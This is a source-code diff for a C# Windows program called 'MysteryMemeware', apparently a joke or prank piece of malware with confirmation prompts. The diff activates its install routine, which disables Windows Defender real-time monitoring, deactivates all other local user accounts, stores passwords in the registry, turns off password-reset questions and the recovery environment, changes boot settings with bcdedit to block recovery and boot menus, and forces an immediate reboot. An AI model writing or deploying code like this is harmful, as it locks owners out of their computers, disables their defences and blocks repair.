@@ -1,7 +1,12 @@
-﻿namespace MysteryMemeware
+﻿using MysteryHelper;
+namespace MysteryInstaller
 {
     public static class Program
     {
+        private static readonly string InstallLocation = PathHelper.RootDrive + "MysteryMemeware\\MysteryMemeware.exe";
+        public static readonly string UserPasswordRegistryPath = "Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MysteryMemeware\\UserPassword";
+        public static readonly string AdminPasswordRegistryPath = "Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MysteryMemeware\\AdminPassword";
+        public static readonly string IsInstalledRegistryPath = "Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MysteryMemeware\\IsInstalled";
         public static void Main()
         {
             System.Console.ForegroundColor = System.ConsoleColor.White;
@@ -20,7 +25,7 @@
             System.Console.WriteLine();
             string userChoice = System.Console.ReadLine();
             System.Console.WriteLine();
-            if (userChoice is "Confirm Install" || userChoice is "")
+            if (userChoice is "Confirm Install")
             {
                 if (WithinVirtualMachine())
                 {
@@ -36,7 +41,7 @@
                     System.Console.ForegroundColor = System.ConsoleColor.White;
                     string userChoice2 = System.Console.ReadLine();
                     System.Console.WriteLine();
-                    if (userChoice2 is "Install Outside Virtual Machine" || userChoice2 is "")
+                    if (userChoice2 is "Install Outside Virtual Machine")
                     {
                         Install();
                     }
@@ -63,7 +68,7 @@
             System.Environment.Exit(0);
             System.Threading.Thread.Sleep(-1);
         }
-        public static bool WithinVirtualMachine()
+        private static bool WithinVirtualMachine()
         {
             try
             {
@@ -85,7 +90,7 @@
                 return false;
             }
         }
-        public static void PrintCancelMessage()
+        private static void PrintCancelMessage()
         {
             System.Console.ForegroundColor = System.ConsoleColor.White;
             System.Console.WriteLine("Installation will not proceed until propper confirmation is given.");
@@ -97,7 +102,7 @@
             System.Console.WriteLine("Installing MysteryMemeware...");
             try
             {
-                throw new System.Exception("It broke okay.");
+                InstallSubMethod();
             }
             catch (System.Exception exception)
             {
@@ -109,16 +114,16 @@
         private static void InstallSubMethod()
         {
             RegistryHelper.CreateAndSetValue("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableRealtimeMonitoring", 1, RegistryType.DWORD);
-            if (File.Exists(InstallLocation))
+            if (System.IO.File.Exists(InstallLocation))
             {
-                File.Delete(InstallLocation);
+                System.IO.File.Delete(InstallLocation);
             }
-            File.Copy(CurrentExePath, InstallLocation);
+            System.IO.File.Copy(PathHelper.CurrentExePath, InstallLocation);
             foreach (string username in UserHelper.GetLocalUsernames())
             {
                 try
                 {
-                    if (!StringMatchesCaseless(username, UserHelper.CurrentUsername))
+                    if (!StringHelper.MatchesCaseless(username, UserHelper.CurrentUsername))
                     {
                         UserHelper.DeactivateUser(username);
                     }
@@ -163,15 +168,15 @@
             RegistryHelper.CreateAndSetValue("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\NoLocalPasswordResetQuestions", 1, RegistryType.DWORD);
 
             RegistryHelper.CreateAndSetValue(IsInstalledRegistryPath, "true", RegistryType.SZ);
-            RunCommand(System32Folder + "\\ReAgentc.exe", "/disable");
-            RunCommand(System32Folder + "\\bcdedit.exe", "/set {current} bootstatuspolicy ignoreallfailures", true);
-            RunCommand(System32Folder + "\\bcdedit.exe", "/set {default} bootstatuspolicy ignoreallfailures", true);
-            RunCommand(System32Folder + "\\bcdedit.exe", "/set {current} recoveryenabled No", true);
-            RunCommand(System32Folder + "\\bcdedit.exe", "/set {default} recoveryenabled No", true);
-            RunCommand(System32Folder + "\\bcdedit.exe", "/set {bootmgr} displaybootmenu No", true);
-            RunCommand(System32Folder + "\\bcdedit.exe", "/set {globalsettings} advancedoptions false", true);
-            RunCommand(System32Folder + "\\bcdedit.exe", "/set {current} bootmenupolicy standard", true);
-            RunCommand(System32Folder + "\\shutdown.exe", "/r /f /t 0", false);
+            ProcessHelper.AwaitSuccess(ProcessHelper.Start(PathHelper.System32Folder + "\\ReAgentc.exe", "/disable"), true);
+            ProcessHelper.AwaitSuccess(ProcessHelper.Start(PathHelper.System32Folder + "\\bcdedit.exe", "/set {current} bootstatuspolicy ignoreallfailures"), true);
+            ProcessHelper.AwaitSuccess(ProcessHelper.Start(PathHelper.System32Folder + "\\bcdedit.exe", "/set {default} bootstatuspolicy ignoreallfailures"), true);
+            ProcessHelper.AwaitSuccess(ProcessHelper.Start(PathHelper.System32Folder + "\\bcdedit.exe", "/set {current} recoveryenabled No"), true);
+            ProcessHelper.AwaitSuccess(ProcessHelper.Start(PathHelper.System32Folder + "\\bcdedit.exe", "/set {default} recoveryenabled No"), true);
+            ProcessHelper.AwaitSuccess(ProcessHelper.Start(PathHelper.System32Folder + "\\bcdedit.exe", "/set {bootmgr} displaybootmenu No"), true);
+            ProcessHelper.AwaitSuccess(ProcessHelper.Start(PathHelper.System32Folder + "\\bcdedit.exe", "/set {globalsettings} advancedoptions false"), true);
+            ProcessHelper.AwaitSuccess(ProcessHelper.Start(PathHelper.System32Folder + "\\bcdedit.exe", "/set {current} bootmenupolicy standard"), true);
+            ProcessHelper.AwaitSuccess(ProcessHelper.Start(PathHelper.System32Folder + "\\shutdown.exe", "/r /f /t 0"), false);
         }
     }
 }
